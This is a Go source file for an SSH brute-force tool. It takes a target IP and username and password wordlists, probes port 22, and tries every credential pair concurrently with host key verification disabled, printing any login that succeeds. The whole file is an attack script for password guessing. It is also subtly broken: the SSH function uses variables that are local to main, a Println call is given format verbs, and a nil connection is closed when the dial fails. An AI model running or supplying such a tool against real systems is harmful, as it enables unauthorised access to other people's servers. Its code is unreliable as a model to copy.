package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"net"
	"os"
	"sync"
	"time"
)

func main() {

	const THREADS = 8

	pipeline := make(chan int, THREADS)

	var ip string

	var userfile string
	var passfile string

	fmt.Println("Enter IP")
	fmt.Scanf("%s", &ip)
	fmt.Println("Enter path to username file")
	fmt.Scanf("%s", &userfile)
	fmt.Println("Enter path to password file")
	fmt.Scanf("%s", &passfile)
	//fmt.Println(len(os.Args))

	var wg sync.WaitGroup

	knock(ip)

	users, err := readFile(userfile)
	if err != nil {
		log.Println("Cant read username files...exiting")
		os.Exit(1)
	}

	passwords, err := readFile(passfile)
	if err != nil {
		log.Println("Cant read password file....exiting")
		os.Exit(1)
	}

	for _, user := range users {

		for _, pass := range passwords {

			pipeline <- 0

			wg.Add(1)

			go ssh_connect(&wg, user, pass)

		}
	}
	wg.Wait()

}

func readFile(file string) (data []string, err error) {

	buffer, err := os.Open(file)
	if err != nil {
		return
	}

	defer buffer.Close()

	scanner := bufio.NewScanner(buffer)
	for scanner.Scan() {
		data = append(data, scanner.Text())
		fmt.Println(data)
	}

	return
}

func knock(ip string) {

	ip = ip + ":22"
	conn, err := net.Dial("tcp", ip)
	if err != nil {
		fmt.Println("Is the port open ? or are you connected to the internet")

	} else {
		fmt.Println(" PORT 22 ::: IS UP")

	}
	conn.Close()
}

func ssh_connect(wg *sync.WaitGroup, user, pass string) {
	defer wg.Done()

	fmt.Println("Trying %s :: %s", user, pass)
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()

	connect, err := ssh.Dial("tcp", ip, sshConfig)

	if err != nil {

		<-pipeline

		return
	}

	defer connect.Close()

	fmt.Printf("USERNAME AND PASSWORD FOUND -> %s:%s\n", user, pass)

	<-pipeline

}
